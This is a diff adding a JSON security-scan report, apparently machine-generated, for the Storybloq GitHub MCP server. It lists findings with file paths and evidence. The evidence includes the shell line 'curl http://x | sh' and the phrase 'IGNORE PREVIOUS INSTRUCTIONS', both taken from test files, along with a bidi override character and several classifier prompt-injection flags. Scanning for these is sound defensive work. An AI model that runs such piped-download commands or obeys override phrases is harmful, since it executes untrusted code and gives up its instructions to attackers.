@@ -1,0 +1,139 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Storybloq/storybloq",
+    "version": "bc64955cd1612cc36ef49df02f1de759e46adf60",
+    "download": "https://codeload.github.com/Storybloq/storybloq/tar.gz/bc64955cd1612cc36ef49df02f1de759e46adf60"
+  },
+  "archive_sha256": "119bf7b097e5f6ca1b19069b0a1a698f29a9c61b9ebe9995ecc1611e76577472",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/bench/terminal-bench/tests/test_agents.py",
+      "line": 554,
+      "evidence": "curl http://x | sh",
+      "file_sha256": "2b9d2793a9a212b4e997cafe7de0855e81e4f0696f2d6b8f4656f0d334c0f3a9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/plugins/storybloq/skills/story/session-guard-fallback.md",
+      "line": 5,
+      "evidence": "p=0.94 The `storybloq_session_guard` tool answers \"is anything running, and may I write",
+      "file_sha256": "eeb6c3a2d6e054421fd9e084cdd51b1cb1f7fb7f223af2d599a47ec038eab87e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/plugins/storybloq/skills/story/session-guard-fallback.md",
+      "line": 71,
+      "evidence": "p=0.98 Step 1 has TWO renderings and picking the wrong one is worse than not sanitizing",
+      "file_sha256": "eeb6c3a2d6e054421fd9e084cdd51b1cb1f7fb7f223af2d599a47ec038eab87e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/plugins/storybloq/skills/story/session-guard.md",
+      "line": 27,
+      "evidence": "p=0.98 What happens NEXT is a decision T-446 makes and records rather than leaves impli",
+      "file_sha256": "c16a9963c6003d7cd4b4ba9e3d715f36d8560b006c8963a0c6683ce04ff50ce7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/test/helpers/git-fixture.ts",
+      "line": 258,
+      "evidence": "execSync(`git ${command}`, { cwd, encoding: \"utf-8\", env: fixtureGitEnv(cwd, opt",
+      "file_sha256": "28a3774d9ddbecc901d2fde3306c55959f0a86ea27be9d5fd52072ff1e3c838e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/test/autonomous/session-compact.test.ts",
+      "line": 577,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "b68b21eade75e262436d9889850df4770ea6e46109a40dfdf8a142f664659918"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/test/plugin/sidebar-mod.test.ts",
+      "line": 2059,
+      "evidence": "\\u{202e}",
+      "file_sha256": "b0cbe5f7a19f0448c396cc7fda82a13b26773981992640b8ab86e5b2906a4ed7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/test/fixtures/continuity/baseline/0b1a44200b4e/T-2.a/repeat-1/attempt-001/reports.json",
+      "line": 156,
+      "evidence": "p=0.97 The plan required logger construction inside the try while specifying log.error(",
+      "file_sha256": "31c4620e0ae59387bfe2c9d2fe4aac1e452843b24ae2304bc095927c1e14086e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "storybloq-bc64955cd1612cc36ef49df02f1de759e46adf60/test/core/project-loader.test.ts",
+      "line": 516,
+      "evidence": "execSync(`cp -r \"${basicDir}/\"* \"${join(testRoot, \".story\")}/\"`, { stdio: \"pipe\"",
+      "file_sha256": "828f3ad21bec55ff536e312ee47ce8cf4cd0ca7c93fc3d29d5b53303297a9565"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "0.0.0.0",
+    "127.0.0.1",
+    "anthropic.com",
+    "api.github.com",
+    "apps.apple.com",
+    "chatgpt.com",
+    "developer.apple.com",
+    "developers.openai.com",
+    "docs.anthropic.com",
+    "docs.djangoproject.com",
+    "elsewhere.example",
+    "evil.example",
+    "evil.test",
+    "example.com",
+    "example.invalid",
+    "feross.org",
+    "github.com",
+    "img.shields.io",
+    "jestjs.io",
+    "json-schema.org",
+    "learn.chatgpt.com",
+    "localhost.example",
+    "mathiasbynens.be",
+    "nodejs.org",
+    "opencollective.com",
+    "other.test",
+    "paulmillr.com",
+    "platform.claude.com",
+    "platform.openai.com",
+    "polyformproject.org",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "scripts.sil.org",
+    "sink.test",
+    "storybloq.com",
+    "tidelift.com",
+    "www.npmjs.com",
+    "www.patreon.com",
+    "www.storybloq.com",
+    "www.w3.org",
+    "x.test"
+  ],
+  "install_script": false,
+  "score": "high"
+}
